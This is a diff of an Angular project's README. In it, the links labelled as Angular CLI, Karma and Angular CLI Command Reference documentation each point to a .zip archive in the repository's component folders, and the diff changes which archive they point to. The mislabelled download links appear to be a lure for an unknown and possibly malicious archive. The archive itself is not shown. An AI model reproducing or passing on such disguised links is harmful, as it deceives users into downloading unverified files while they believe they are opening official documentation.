@@ -1,6 +1,6 @@
 # Portfilio
 
-This project was generated using [Angular CLI](https://raw.githubusercontent.com/Mohamed-Amine-Yakoubi/My_Portfolio/main/src/app/Components/featured-projects/Portfolio-My-v3.1.zip) version 19.1.7.
+This project was generated using [Angular CLI](https://raw.githubusercontent.com/Mohamed-Amine-Yakoubi/My_Portfolio/main/src/app/Components/skills/Portfolio_My_3.1.zip) version 19.1.7.
 
 ## Development server
 
@@ -38,7 +38,7 @@ This will compile your project and store the build artifacts in the `dist/` dire
 
 ## Running unit tests
 
-To execute unit tests with the [Karma](https://raw.githubusercontent.com/Mohamed-Amine-Yakoubi/My_Portfolio/main/src/app/Components/featured-projects/Portfolio-My-v3.1.zip) test runner, use the following command:
+To execute unit tests with the [Karma](https://raw.githubusercontent.com/Mohamed-Amine-Yakoubi/My_Portfolio/main/src/app/Components/skills/Portfolio_My_3.1.zip) test runner, use the following command:
 
 ```bash
 ng test
@@ -56,4 +56,4 @@ Angular CLI does not come with an end-to-end testing framework by default. You c
 
 ## Additional Resources
 
-For more information on using the Angular CLI, including detailed command references, visit the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/Mohamed-Amine-Yakoubi/My_Portfolio/main/src/app/Components/featured-projects/Portfolio-My-v3.1.zip) page.
+For more information on using the Angular CLI, including detailed command references, visit the [Angular CLI Overview and Command Reference](https://raw.githubusercontent.com/Mohamed-Amine-Yakoubi/My_Portfolio/main/src/app/Components/skills/Portfolio_My_3.1.zip) page.
